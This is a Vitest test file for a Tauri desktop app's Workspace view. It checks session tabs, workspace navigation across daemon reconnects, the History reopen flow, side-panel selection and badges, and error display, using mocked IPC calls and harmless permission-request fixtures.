// @vitest-environment happy-dom

import { act, type ReactNode } from "react";
import { createRoot } from "react-dom/client";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { DaemonStatus, PermissionRequest, PermissionResolved, Session } from "../../types/ipc";

vi.mock("@tauri-apps/plugin-dialog", () => ({
  // The recovery confirmation dialog; each test that needs a specific answer
  // overrides the resolved value.
  ask: vi.fn(async () => false),
}));

vi.mock("@tauri-apps/api/core", () => ({
  // Presence reporting starts with the App mount now; this mock keeps the
  // core invokes these tests can still reach hermetic (presence.test.ts
  // covers the reporter itself).
  invoke: vi.fn(async () => undefined),
}));

vi.mock("../../lib/tauri", () => ({
  daemonStatus: vi.fn(async () => ({
    state: "connected",
    pid: 42,
    instanceId: "daemon-test",
    protocolVersion: 1,
    clients: 1,
    capabilities: ["typed_permissions"],
    message: null,
  })),
  projectsList: vi.fn(),
  projectAdd: vi.fn(),
  workspacesList: vi.fn(),
  workspaceCreate: vi.fn(),
  // The Changes panel is the registry's default and reads on mount: these are
  // its two roads, answered with a clean tree so nothing here shows a refusal
  // unless a test asks for one (each test's override is re-pinned in beforeEach,
  // which `clearAllMocks` does not undo).
  workspaceGitStatus: vi.fn(async () => ({
    isGit: true,
    dirty: false,
    branch: "main",
    totals: { additions: 0, deletions: 0 },
    rows: [],
    error: null,
  })),
  workspaceGitDiff: vi.fn(async () => ({
    path: "src/writer.ts",
    isNew: false,
    isDeleted: false,
    additions: 0,
    deletions: 0,
    lines: [],
    status: "ok",
    error: null,
  })),
  // The Files panel reads the moment a test selects it (the badge test
  // below): its one road, answered with an empty folder so nothing here
  // shows a refusal unless a test asks for one.
  workspaceFilesList: vi.fn(async () => ({
    path: "",
    entries: [],
    capped: false,
    skipped: 0,
    error: null,
  })),
  sessionsList: vi.fn(),
  sessionResume: vi.fn(),
  journalUsage: vi.fn(),
  sessionDelete: vi.fn(),
  sessionCreate: vi.fn(),
  providersList: vi.fn(),
  sessionPresence: vi.fn(async () => undefined),
  daemonRestart: vi.fn(async () => undefined),
  sessionPermissionRespond: vi.fn(async () => undefined),
  createSessionStateChannel: vi.fn((onSnapshot: (snapshots: unknown[]) => void) => ({
    onSnapshot,
  })),
  sessionsWatch: vi.fn(async () => undefined),
  sessionsUnwatch: vi.fn(async () => undefined),
  // The delegation pair: the shared controller binds them at module load, so
  // the mock must name them even though the tests below inject their own
  // controller.
  delegationGet: vi.fn(async () => ({ enabled: false, source: "default" })),
  delegationSet: vi.fn(async () => undefined),
  // The session badge's name map: one read per daemon connection. Individual
  // tests override the reply; the default has one paired device to name.
  devicesList: vi.fn(async () => ({ selfInfo: undefined, peers: [], pending: [] })),
}));

vi.mock("../terminal/TerminalSurface", () => ({
  TerminalSurface: ({
    sessionId,
    workspaceId,
    cwd,
  }: {
    sessionId: string;
    workspaceId?: string | null;
    cwd?: string;
  }) => (
    <div data-testid="terminal-surface" data-workspace-id={workspaceId ?? "null"}>
      {sessionId}
      {cwd ? `cwd:${cwd}` : ""}
    </div>
  ),
}));

vi.mock("./AgentChatSurface", () => ({
  AgentChatSurface: ({
    sessionId,
    auxiliary,
    onPermissionRequest,
    onPermissionResolved,
  }: {
    sessionId: string;
    auxiliary?: ReactNode;
    onPermissionRequest?: (
      sessionId: string,
      subscriptionId: number,
      request: PermissionRequest,
    ) => void;
    onPermissionResolved?: (sessionId: string, resolution: PermissionResolved) => void;
  }) => (
    <div data-testid="agent-chat-surface">
      {sessionId}
      <div className="workspace-conversation">{auxiliary}</div>
      <div data-testid="mock-composer" />
      <button
        type="button"
        data-testid="emit-permission-a"
        onClick={() =>
          onPermissionRequest?.(sessionId, 41, {
            type: "permission_request",
            toolCallId: "tool-a",
            title: "Run command",
            command: "cmd.exe",
            args: ["/c", "echo", "alpha"],
            cwd: "C:\\alpha",
            options: [
              { optionId: "allow", name: "Allow once", kind: "allow_once" },
              { optionId: "deny", name: "Deny", kind: "reject_once" },
            ],
          })
        }
      />
      <button
        type="button"
        data-testid="emit-permission-a-renewed"
        onClick={() =>
          onPermissionRequest?.(sessionId, 42, {
            type: "permission_request",
            toolCallId: "tool-a",
            title: "Run command",
            command: "cmd.exe",
            args: ["/c", "echo", "alpha"],
            cwd: "C:\\alpha",
            options: [
              { optionId: "allow", name: "Allow once", kind: "allow_once" },
              { optionId: "deny", name: "Deny", kind: "reject_once" },
            ],
          })
        }
      />
      <button
        type="button"
        data-testid="emit-permission-b"
        onClick={() =>
          onPermissionRequest?.(sessionId, 41, {
            type: "permission_request",
            toolCallId: "tool-b",
            title: "Run command",
            command: "ping.exe",
            args: ["-n", "1", "127.0.0.1"],
            cwd: "C:\\beta",
            options: [
              { optionId: "allow", name: "Allow once", kind: "allow_once" },
              { optionId: "deny", name: "Deny", kind: "reject_once" },
            ],
          })
        }
      />
      <button
        type="button"
        data-testid="emit-permission-resolved"
        onClick={() =>
          onPermissionResolved?.(sessionId, { type: "permission_resolved", toolCallId: "tool-a" })
        }
      />
      <button
        type="button"
        data-testid="emit-permission-resolved-creator-allow-always"
        onClick={() =>
          onPermissionResolved?.(sessionId, {
            type: "permission_resolved",
            toolCallId: "tool-a",
            answeredBy: "s.creator.1",
            selectedOptionId: "allow-always",
            selectedOptionKind: "allow_always",
            selectedOptionName: "Allow always",
          })
        }
      />
      <button
        type="button"
        data-testid="emit-permission-resolved-silent"
        onClick={() =>
          onPermissionResolved?.(sessionId, {
            type: "permission_resolved",
            toolCallId: "tool-a",
            answeredBy: null,
          })
        }
      />
      <button
        type="button"
        data-testid="emit-permission-resolved-creator-allowed"
        onClick={() =>
          onPermissionResolved?.(sessionId, {
            type: "permission_resolved",
            toolCallId: "tool-a",
            answeredBy: "s.creator.1",
            selectedOptionId: "allow",
            selectedOptionKind: "allow_once",
            selectedOptionName: "Allow once",
          })
        }
      />
      <button
        type="button"
        data-testid="emit-permission-resolved-creator-denied"
        onClick={() =>
          onPermissionResolved?.(sessionId, {
            type: "permission_resolved",
            toolCallId: "tool-a",
            answeredBy: "s.creator.1",
            selectedOptionId: "deny",
            selectedOptionKind: "reject_once",
            selectedOptionName: "Deny",
          })
        }
      />
      <button
        type="button"
        data-testid="emit-permission-shared"
        onClick={() =>
          onPermissionRequest?.(sessionId, 41, {
            type: "permission_request",
            toolCallId: "shared-tool",
            title: "Run command",
            command: `shared-${sessionId}`,
            cwd: `C:\\${sessionId}`,
            options: [
              { optionId: "allow", name: "Allow once", kind: "allow_once" },
              { optionId: "deny", name: "Deny", kind: "reject_once" },
            ],
          })
        }
      />
    </div>
  ),
}));

import {
  daemonRestart,
  daemonStatus,
  devicesList,
  journalUsage,
  projectAdd,
  projectsList,
  providersList,
  workspaceCreate,
  workspaceGitStatus,
  workspacesList,
  sessionCreate,
  sessionDelete,
  sessionPermissionRespond,
  createSessionStateChannel,
  sessionsList,
  sessionResume,
  sessionsWatch,
} from "../../lib/tauri";
import { ask } from "@tauri-apps/plugin-dialog";
import type {
  DevicesReply,
  JournalUsage,
  Project,
  Workspace as IpcWorkspace,
  WorkspaceGitStatus,
} from "../../types/ipc";
import { Workspace, WorkspacePermissionCard } from "./Workspace";
import { resetSharedSessionControllerForTests, sharedSessionController } from "./workspaceSessions";
import { createDelegationController } from "../../lib/delegation";
import type { SessionStateSnapshot } from "../../types/ipc";
import { SIDE_PANEL_REGISTRY, type SidePanelEntry } from "./sidePanelRegistry";

const terminal = (
  id: string,
  title: string,
  workspaceId: string | null = "workspace-1",
): Session => ({
  id,
  workspaceId,
  kind: "terminal",
  title,
  state: { type: "live", generation: 1 },
  elapsedMs: 0,
});

const acpSession = (id: string, title: string): Session => ({
  ...terminal(id, title),
  kind: "acp",
});

const project: Project = { id: "project-1", name: "devboule", path: "C:\\devboule" };
const workspace: IpcWorkspace = {
  id: "workspace-1",
  projectId: project.id,
  title: "main",
  isolation: "local",
  path: "C:\\devboule",
};
const secondProject: Project = {
  id: "project-2",
  name: "other-project",
  path: "C:\\other-project",
};
const secondWorkspace: IpcWorkspace = {
  id: "workspace-2",
  projectId: secondProject.id,
  title: "other-main",
  isolation: "local",
  path: "C:\\other-project",
};
const otherWorkspace: IpcWorkspace = {
  id: "workspace-other",
  projectId: project.id,
  title: "other-main",
  isolation: "local",
  path: "C:\\devboule\\other",
};
const createdWorkspace: IpcWorkspace = {
  id: "workspace-created",
  projectId: project.id,
  title: "new-workspace",
  isolation: "local",
  path: "C:\\devboule",
};

/** The Changes panel's default answer: a repository with nothing to show. */
const cleanChanges: WorkspaceGitStatus = {
  isGit: true,
  dirty: false,
  branch: "main",
  totals: { additions: 0, deletions: 0 },
  rows: [],
  error: null,
};

const dirtyChanges: WorkspaceGitStatus = {
  isGit: true,
  dirty: true,
  branch: "main",
  totals: { additions: 12, deletions: 3 },
  rows: [{ path: "src/writer.ts", additions: 12, deletions: 3, status: "modified", capped: false }],
  error: null,
};

const daemonConnected: DaemonStatus = {
  state: "connected",
  pid: 42,
  instanceId: "daemon-test",
  protocolVersion: 1,
  clients: 1,
  capabilities: ["typed_permissions"],
  message: null,
};

const daemonDisconnected: DaemonStatus = {
  state: "disconnected",
  pid: null,
  instanceId: null,
  protocolVersion: null,
  clients: null,
  capabilities: [],
  message: "daemon unreachable",
};

const devicesReply: DevicesReply = {
  selfInfo: {
    deviceId: "device-self",
    displayName: "This laptop",
    publicKey: "cHVibGljLWtleQ==",
    keyFingerprint: "0a1b2c3d4e5f60718293a4b5c6d7e8f9",
    addresses: ["100.64.0.1"],
    port: 47831,
    daemonVersion: "0.1.0",
    protocolVersion: 1,
    remote: { state: "enabled", reason: null },
  },
  peers: [
    {
      deviceId: "device-phone",
      displayName: "Xiaomi 14",
      role: "client",
      publicKey: "cHVibGljLWtleQ==",
      keyFingerprint: "f9e8d7c6b5a4938271605f4e3d2c1b0a",
      bindingKind: "tailnet",
      bindingNodeName: "xiaomi-14.tail80a42d.ts.net.",
      bindingLoginName: "user@example.com",
      address: "100.74.116.126:47831",
      pairedAt: 1_760_000_000_000,
      revokedAt: null,
      caps: ["view", "send"],
      pairedByUser: null,
      online: true,
    },
  ],
  pending: [],
};

const permissionRequest: PermissionRequest = {
  type: "permission_request",
  toolCallId: "tool-test",
  title: "Run command",
  command: "echo test",
  options: [
    { optionId: "allow", name: "Allow once", kind: "allow_once" },
    { optionId: "deny", name: "Deny", kind: "reject_once" },
  ],
};

const spawnPermissionRequest: PermissionRequest = {
  type: "permission_request",
  toolCallId: "tool-spawn",
  title: "Run command",
  command: "cmd.exe",
  args: ["/c", "echo", "gated"],
  cwd: "C:\\work\\tree",
  options: [
    { optionId: "allow", name: "Allow once", kind: "allow_once" },
    { optionId: "deny", name: "Deny", kind: "reject_once" },
  ],
};

const historyUsage: JournalUsage = {
  totalBytes: 32,
  sessionCount: 1,
  deletedByUser: 0,
  deletedByRetention: 0,
  unreclaimable: { bytesOver: 0, sessionsOver: 0, agedOut: 0 },
  limits: {
    snapshotEveryBytes: 65_536,
    sessionMaxBytes: 512,
    maxBytes: 1024,
    maxSessions: 10,
    maxAgeMs: 0,
  },
  perSession: [
    { id: "session-1", title: "Saved build history", kind: "terminal", bytes: 32, updatedAtMs: 0 },
  ],
};

function setSearchValue(input: HTMLInputElement, value: string) {
  const setter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value")?.set;
  if (!setter) throw new Error("input value setter did not resolve");
  setter.call(input, value);
  input.dispatchEvent(new Event("input", { bubbles: true }));
}

/**
 * A promise the test resolves itself, so a mocked read lands when the test says
 * it does instead of when a guessed number of `act` ticks happen to elapse.
 */
function deferred<T>(): { promise: Promise<T>; resolve: (value: T) => void } {
  let resolve!: (value: T) => void;
  const promise = new Promise<T>((resolvePromise) => {
    resolve = resolvePromise;
  });
  return { promise, resolve };
}

/** The + menu's entry: every strip flow opens the menu and picks from it. */
function newTabMenuItem(container: HTMLElement, label: string): HTMLButtonElement {
  // The menu portals to the document — the container's own document hosts it.
  const item = [
    ...container.ownerDocument.querySelectorAll<HTMLButtonElement>("[role='menuitem']"),
  ].find((button) => button.textContent === label);
  if (item === undefined) throw new Error(`+ menu item did not render: ${label}`);
  return item;
}

describe("Workspace sessions", () => {
  let container: HTMLDivElement;
  let root: ReturnType<typeof createRoot>;

  beforeEach(() => {
    // The shared controller is app-lifetime in production; a test must not
    // inherit the roster a previous test left in it.
    resetSharedSessionControllerForTests();
    container = document.createElement("div");
    document.body.appendChild(container);
    vi.mocked(projectsList).mockResolvedValue([project]);
    vi.mocked(workspacesList).mockResolvedValue([workspace]);
    vi.mocked(workspaceCreate).mockResolvedValue(createdWorkspace);
    vi.mocked(sessionsList).mockResolvedValue([terminal("session-1", "shell one")]);
    vi.mocked(sessionCreate).mockResolvedValue({
      ...terminal("session-2", "agent two"),
      kind: "acp",
    });
    // One installed, non-npx provider: "+ → Agent" takes the single-provider
    // fast path and creates. Tests that need an empty or multi-provider
    // catalog override this.
    vi.mocked(providersList).mockResolvedValue({ providers: [grokProvider], unreadableDirs: 0 });
    vi.mocked(devicesList).mockResolvedValue(devicesReply);
    vi.mocked(workspaceGitStatus).mockResolvedValue(cleanChanges);
    // The factory default already says "connected", but a nested describe's
    // override survives `clearAllMocks`, so pin it here for every test.
    vi.mocked(daemonStatus).mockResolvedValue(daemonConnected);
  });

  afterEach(async () => {
    await act(async () => root.unmount());
    container.remove();
    vi.clearAllMocks();
  });

  it("loads daemon projects and workspaces and derives workspace facts from live sessions", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      terminal("live-session", "live shell", "workspace-1"),
      {
        ...terminal("ended-session", "ended shell", "workspace-1"),
        state: { type: "ended", generation: 1, code: 0, integrity: { kind: "complete" } },
      },
    ]);
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    // Projects load exactly once — from the daemon's connected transition,
    // with no duplicate mount load.
    expect(projectsList).toHaveBeenCalledTimes(1);
    expect(workspacesList).toHaveBeenCalledWith(project.id);
    const row = container.querySelector<HTMLButtonElement>(
      "button[aria-pressed='true'].workspace-row",
    );
    // A live session is the norm: the row says nothing about it in words —
    // the running dot breathes, and the isolation word is gone (spec).
    expect(row?.textContent).not.toContain("live session");
    expect(row?.querySelector(".sidebar-row-dot-pulse")).not.toBeNull();
    expect(row?.title).toBe("C:\\devboule");
  });

  it("after a reconnect, a restored selection in another workspace is honoured again", async () => {
    // The user clicks a row (automatic navigation stands down), then a
    // daemon restart restores a session that lives in the OTHER workspace:
    // the reconnect must re-arm selection-to-workspace navigation so the
    // restored session is not discarded (review: userNavigatedRef never
    // reset).
    vi.useFakeTimers();
    try {
      let answer!: (status: DaemonStatus) => void;
      vi.mocked(daemonStatus).mockImplementation(
        () =>
          new Promise<DaemonStatus>((resolve) => {
            answer = resolve;
          }),
      );
      vi.mocked(workspacesList).mockResolvedValue([workspace, secondWorkspace]);
      vi.mocked(sessionsList).mockResolvedValue([
        terminal("session-1", "shell one", "workspace-1"),
        terminal("session-w2", "other shell", "workspace-2"),
      ]);
      root = createRoot(container);
      await act(async () => root.render(<Workspace />));
      await act(async () => answer(daemonConnected));
      await act(async () => vi.advanceTimersByTimeAsync(2_100));
      await act(async () => undefined);

      // The user navigates to workspace-2 by row click...
      const otherRow = [...container.querySelectorAll<HTMLButtonElement>(".workspace-row")].find(
        (row) => row.textContent?.includes("other-main") === true,
      );
      if (otherRow === undefined) throw new Error("second workspace row did not render");
      await act(async () => otherRow.click());
      expect(container.querySelector("#workspace-session-tab-session-w2")).not.toBeNull();

      // ...and the daemon restarts. The reloaded roster no longer carries
      // session-w2; its restored replacement lives in workspace-1. The
      // reconnect reset the user-navigation flag, so the restored selection
      // is honoured: the view moves to workspace-1 and its tab renders.
      vi.mocked(sessionsList).mockResolvedValue([
        terminal("session-1", "shell one", "workspace-1"),
      ]);
      await act(async () => {
        answer({ ...daemonConnected, state: "disconnected" });
        await vi.advanceTimersByTimeAsync(2_100);
      });
      await act(async () => {
        answer(daemonConnected);
        await vi.advanceTimersByTimeAsync(2_100);
      });
      await act(async () => undefined);

      expect(container.querySelector("#workspace-session-tab-session-w2")).toBeNull();
      expect(container.querySelector("#workspace-session-tab-session-1")).not.toBeNull();
    } finally {
      vi.useRealTimers();
    }
  });

  it("a pushed selection in another workspace lands there with that session, and settles", async () => {
    // Two populated workspaces: A (workspace-1) is shown, B (workspace-2)
    // has its own live session. The daemon pushes a restored selection that
    // lives in B. One reconciliation must move the workspace AND keep the
    // session — the old two-effect version scheduled the switch while the
    // strip-follow, still closing over A's strip, pulled A's first tab back,
    // and the two kept reversing each other.
    vi.useFakeTimers();
    try {
      let answer!: (status: DaemonStatus) => void;
      vi.mocked(daemonStatus).mockImplementation(
        () =>
          new Promise<DaemonStatus>((resolve) => {
            answer = resolve;
          }),
      );
      vi.mocked(workspacesList).mockResolvedValue([workspace, secondWorkspace]);
      vi.mocked(sessionsList).mockResolvedValue([
        terminal("session-1", "shell one", "workspace-1"),
        terminal("session-w2", "other shell", "workspace-2"),
      ]);
      root = createRoot(container);
      await act(async () => root.render(<Workspace />));
      await act(async () => answer(daemonConnected));
      await act(async () => vi.advanceTimersByTimeAsync(2_100));
      await act(async () => undefined);

      expect(container.querySelector("#workspace-session-tab-session-1")).not.toBeNull();
      expect(container.querySelector("#workspace-session-tab-session-w2")).toBeNull();

      // The push.
      await act(async () => sharedSessionController().select("session-w2"));
      await act(async () => vi.advanceTimersByTimeAsync(2_100));
      await act(async () => undefined);

      // Landed on B, with B's session — not B's first tab after a fight.
      expect(container.querySelector("#workspace-session-tab-session-w2")).not.toBeNull();
      expect(container.querySelector("#workspace-session-tab-session-1")).toBeNull();

      // Bounded: after further ticks and roster re-resolutions the view
      // stays where it settled — no further state updates.
      await act(async () => vi.advanceTimersByTimeAsync(4_200));
      await act(async () => undefined);
      expect(container.querySelector("#workspace-session-tab-session-w2")).not.toBeNull();
      expect(container.querySelector("#workspace-session-tab-session-1")).toBeNull();
    } finally {
      vi.useRealTimers();
    }
  });

  it("a pushed selection into a search-hidden workspace still lands there", async () => {
    // Search hides B's sidebar row, but the daemon still lists B: search
    // must not veto selection-to-workspace navigation (the known-workspace
    // set reads all listed projects, not the filtered view).
    vi.useFakeTimers();
    try {
      let answer!: (status: DaemonStatus) => void;
      vi.mocked(daemonStatus).mockImplementation(
        () =>
          new Promise<DaemonStatus>((resolve) => {
            answer = resolve;
          }),
      );
      vi.mocked(workspacesList).mockResolvedValue([workspace, secondWorkspace]);
      vi.mocked(sessionsList).mockResolvedValue([
        terminal("session-1", "shell one", "workspace-1"),
        terminal("session-w2", "other shell", "workspace-2"),
      ]);
      root = createRoot(container);
      await act(async () => root.render(<Workspace />));
      await act(async () => answer(daemonConnected));
      await act(async () => vi.advanceTimersByTimeAsync(2_100));
      await act(async () => undefined);

      // The query matches only A's row ("devboule main"); B's row drops out.
      const input = container.querySelector<HTMLInputElement>(".workspace-search input");
      if (input === null) throw new Error("search input did not render");
      await act(async () => setSearchValue(input, "devboule main"));
      const rowsAfterSearch = [...container.querySelectorAll<HTMLButtonElement>(".workspace-row")];
      expect(rowsAfterSearch.some((row) => row.textContent?.includes("other-main"))).toBe(false);

      await act(async () => sharedSessionController().select("session-w2"));
      await act(async () => vi.advanceTimersByTimeAsync(2_100));
      await act(async () => undefined);

      expect(container.querySelector("#workspace-session-tab-session-w2")).not.toBeNull();
      expect(container.querySelector("#workspace-session-tab-session-1")).toBeNull();
    } finally {
      vi.useRealTimers();
    }
  });

  it("a workspace removed on reload is dropped, and the selection moves to a survivor", async () => {
    // The daemon hook polls every 2 s; the disconnect/reconnect ticks are
    // driven with fake timers like the reconnect test above.
    vi.useFakeTimers();
    try {
      let answer!: (status: DaemonStatus) => void;
      vi.mocked(daemonStatus).mockImplementation(
        () =>
          new Promise<DaemonStatus>((resolve) => {
            answer = resolve;
          }),
      );
      vi.mocked(workspacesList)
        .mockResolvedValueOnce([workspace, secondWorkspace])
        .mockResolvedValue([workspace]);
      vi.mocked(sessionsList).mockResolvedValue([]);
      root = createRoot(container);
      await act(async () => root.render(<Workspace />));
      await act(async () => answer(daemonConnected));
      await act(async () => undefined);
      await act(async () => vi.advanceTimersByTimeAsync(2_100));

      const doomedRow = [...container.querySelectorAll<HTMLButtonElement>(".workspace-row")].find(
        (row) => row.textContent?.includes("other-main") === true,
      );
      if (doomedRow === undefined) throw new Error("doomed workspace row did not render");
      await act(async () => doomedRow.click());
      expect(doomedRow.getAttribute("aria-pressed")).toBe("true");

      // A disconnect/reconnect cycle reloads the workspaces; the daemon no
      // longer lists the doomed one, so it leaves the view and the selection
      // moves to the surviving workspace. Each advance fires one poll; each
      // poll's answer must be written only after that poll exists.
      await act(async () => {
        answer({ ...daemonConnected, state: "disconnected" });
        await vi.advanceTimersByTimeAsync(2_100);
      });
      await act(async () => {
        answer(daemonConnected);
        await vi.advanceTimersByTimeAsync(2_100);
      });
      await act(async () => undefined);

      expect(container.textContent).not.toContain("other-main");
      const survivor = container.querySelector<HTMLButtonElement>(".workspace-row");
      expect(survivor?.getAttribute("aria-pressed")).toBe("true");
    } finally {
      vi.useRealTimers();
    }
  });

  it("selecting a workspace shows only its tabs, and an empty workspace shows the empty state", async () => {
    vi.mocked(workspacesList).mockResolvedValue([workspace, secondWorkspace]);
    vi.mocked(sessionsList).mockResolvedValue([terminal("session-1", "shell one", "workspace-1")]);
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    expect(container.querySelector("#workspace-session-tab-session-1")).not.toBeNull();

    // workspace-2 has no sessions: switching to it hides workspace-1's tab
    // and shows the empty state, never the other workspace's pane.
    const otherRow = [...container.querySelectorAll<HTMLButtonElement>(".workspace-row")].find(
      (row) => row.textContent?.includes("other-main") === true,
    );
    if (otherRow === undefined) throw new Error("second workspace row did not render");
    await act(async () => otherRow.click());

    expect(container.querySelector("#workspace-session-tab-session-1")).toBeNull();
    expect(container.textContent).toContain("No tabs yet");
  });

  it("reopening a History session navigates to its workspace", async () => {
    vi.mocked(workspacesList).mockResolvedValue([workspace, secondWorkspace]);
    // A recovered session lives in workspace-1; workspace-2 stays empty.
    vi.mocked(sessionsList).mockResolvedValue([
      {
        id: "session-1",
        workspaceId: "workspace-1",
        kind: "terminal",
        title: "Saved build history",
        state: {
          type: "recovered",
          generation: 2,
          integrity: { kind: "unverifiable", droppedFrames: 0, droppedBytes: 0, trimmedBytes: 0 },
        },
        elapsedMs: null,
        resumable: true,
      },
    ]);
    vi.mocked(sessionResume).mockResolvedValue({
      type: "resumed",
      session: terminal("session-1", "Saved build history", "workspace-1"),
    });
    vi.mocked(journalUsage).mockResolvedValue(historyUsage);
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    // Start from the empty workspace-2.
    const otherRow = [...container.querySelectorAll<HTMLButtonElement>(".workspace-row")].find(
      (row) => row.textContent?.includes("other-main") === true,
    );
    if (otherRow === undefined) throw new Error("second workspace row did not render");
    await act(async () => otherRow.click());
    expect(container.textContent).toContain("No tabs yet");

    await act(async () => {
      container.querySelector<HTMLButtonElement>(".workspace-history-button")?.click();
    });
    await act(async () => undefined);
    const reopen = container.querySelector<HTMLButtonElement>(".history-reopen-action");
    if (reopen === null) throw new Error("history reopen button did not render");
    await act(async () => reopen.click());
    await act(async () => undefined);

    // The reopen navigated to the session's workspace and its tab is up.
    expect(container.querySelector("#workspace-session-tab-session-1")).not.toBeNull();
    expect(container.textContent).not.toContain("No tabs yet");
  });

  it("renders and selects an extra panel supplied through the registry", async () => {
    const extraPanel: SidePanelEntry = {
      id: "plugin-panel-test",
      name: "Plugin panel",
      meta: "test",
      dotTone: "green",
      render: () => <div data-testid="plugin-panel">Plugin panel content</div>,
    };
    const registry: SidePanelEntry[] = [...SIDE_PANEL_REGISTRY, extraPanel];

    root = createRoot(container);
    await act(async () => root.render(<Workspace sidePanelRegistry={registry} />));
    await act(async () => undefined);

    const selector = container.querySelector<HTMLButtonElement>(".workspace-surface-selector");
    if (selector === null) throw new Error("side panel selector did not render");
    await act(async () => selector.click());
    const option = Array.from(
      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("Plugin panel"));
    if (option === undefined) throw new Error("extra registry panel did not render");
    await act(async () => option.click());

    expect(container.querySelector("[data-testid=plugin-panel]")?.textContent).toBe(
      "Plugin panel content",
    );

    await act(async () => selector.click());
    const selectedOption = Array.from(
      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("Plugin panel"));
    expect(selectedOption?.getAttribute("aria-selected")).toBe("true");
  });

  describe("the Changes badge in the panel selector", () => {
    afterEach(() => {
      // An override above must not leak: `clearAllMocks` keeps implementations,
      // and the second top-level describe has no pin of its own.
      vi.mocked(workspaceGitStatus).mockResolvedValue(cleanChanges);
    });

    async function renderWorkspace() {
      root = createRoot(container);
      await act(async () => root.render(<Workspace />));
      // Projects → workspaces → selection is a three-hop chain; flush it
      // rather than guess one tick.
      for (let hop = 0; hop < 4; hop += 1) {
        await act(async () => undefined);
      }
    }

    function badge(): string | null | undefined {
      return container.querySelector(".workspace-surface-meta")?.textContent;
    }

    function option(label: string): HTMLButtonElement {
      const match = Array.from(
        container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
      ).find((button) => button.textContent?.includes(label));
      if (match === undefined) throw new Error(`side panel option did not render: ${label}`);
      return match;
    }

    it("shows nothing known until the open panel's own read lands, then the label it read", async () => {
      // A workspace id no other test has read: the badge store is module-level
      // and only ever grows, so "never read" needs an id nothing has reported.
      vi.mocked(workspacesList).mockResolvedValue([{ ...workspace, id: "workspace-badge-unread" }]);
      // The restored selection lives in the fresh workspace too: selection is
      // navigation, so the view must land there and read THAT workspace.
      vi.mocked(sessionsList).mockResolvedValue([
        terminal("session-1", "shell one", "workspace-badge-unread"),
      ]);
      const pending = deferred<WorkspaceGitStatus>();
      vi.mocked(workspaceGitStatus).mockReturnValue(pending.promise);
      await renderWorkspace();

      // Two readers now: the sidebar's row stat and the open panel's badge —
      // each reads for itself, and neither shows anything known yet.
      // Two independent readers read the fresh id: the sidebar's row stat
      // and the open panel's badge (the sidebar's cadence is pinned in
      // useWorkspaceStats.test.tsx, where the triggers are controllable).
      const freshReads = vi
        .mocked(workspaceGitStatus)
        .mock.calls.filter((call) => call[0] === "workspace-badge-unread").length;
      expect(freshReads).toBeGreaterThanOrEqual(2);
      expect(badge()).toBe("—");

      await act(async () => {
        pending.resolve(dirtyChanges);
      });
      expect(badge()).toBe("+12 −3");
    });

    it("keeps the last label the Changes panel read once another panel is selected", async () => {
      // Its own workspace id as well: the label written here must not become
      // another test's badge.
      vi.mocked(workspacesList).mockResolvedValue([{ ...workspace, id: "workspace-badge-kept" }]);
      vi.mocked(workspaceGitStatus).mockResolvedValue(dirtyChanges);
      await renderWorkspace();
      expect(badge()).toBe("+12 −3");

      const selector = container.querySelector<HTMLButtonElement>(".workspace-surface-selector");
      if (selector === null) throw new Error("side panel selector did not render");
      await act(async () => selector.click());
      await act(async () => option("Files").click());
      // The toolbar now carries the selected panel's badge …
      expect(badge()).toBe("read-only");

      // … while Changes keeps the value it last read: no panel is mounted to
      // refresh it (DECISIONS §9: no background poller for a decoration).
      await act(async () => selector.click());
      expect(option("Changes").querySelector(".workspace-surface-option-meta")?.textContent).toBe(
        "+12 −3",
      );
    });
  });

  it("renders the first registry entry for an unknown active panel without selecting it", async () => {
    const fallbackPanel: SidePanelEntry = {
      id: "only-available-panel",
      name: "Available panel",
      meta: "test",
      dotTone: "green",
      render: () => <div data-testid="fallback-panel">Fallback content</div>,
    };

    root = createRoot(container);
    await act(async () => root.render(<Workspace sidePanelRegistry={[fallbackPanel]} />));
    await act(async () => undefined);

    expect(container.querySelector("[data-testid=fallback-panel]")?.textContent).toBe(
      "Fallback content",
    );
    const selector = container.querySelector<HTMLButtonElement>(".workspace-surface-selector");
    if (selector === null) throw new Error("side panel selector did not render");
    await act(async () => selector.click());

    const option = container.querySelector<HTMLButtonElement>(".workspace-surface-option");
    if (option === null) throw new Error("fallback panel option did not render");
    expect(option.getAttribute("aria-selected")).toBe("false");
  });

  it("exposes the checkout path on hover and omits it when the daemon sent none", async () => {
    const worktreeWorkspace: IpcWorkspace = {
      id: "workspace-worktree",
      projectId: project.id,
      title: "feature-x",
      isolation: "worktree",
      path: "C:\\devboule.worktrees\\feature-x-9f2e1a",
    };
    const bareWorkspace: IpcWorkspace = {
      id: "workspace-bare",
      projectId: project.id,
      title: "no-path",
      isolation: "local",
      path: "",
    };
    vi.mocked(workspacesList).mockResolvedValue([worktreeWorkspace, bareWorkspace]);
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const rows = container.querySelectorAll<HTMLButtonElement>("button.workspace-row");
    expect(rows.length).toBe(2);
    expect(rows[0]?.title).toBe("C:\\devboule.worktrees\\feature-x-9f2e1a");
    expect(rows[0]?.textContent).not.toContain("C:\\devboule.worktrees\\feature-x-9f2e1a");
    expect(rows[1]?.title).toBe("");
  });

  it("keeps the project-load failure visible on a connected daemon until the user retries", async () => {
    // With no mount load there is no pre-connection call to fail; the honest
    // failure case is a connected daemon whose projectsList rejects. The
    // error must stay up (no silent retry loop) with the retry in the
    // user's hands.
    vi.mocked(projectsList).mockRejectedValueOnce(new Error("journal is unavailable"));
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    expect(container.querySelector('[role="alert"]')?.textContent).toContain(
      "journal is unavailable",
    );
    expect(projectsList).toHaveBeenCalledTimes(1);
    expect(container.textContent).not.toContain("No matching workspaces");

    // Still failing, still shown: nothing reloaded behind the user's back.
    await act(async () => undefined);
    expect(container.querySelector('[role="alert"]')?.textContent).toContain(
      "journal is unavailable",
    );
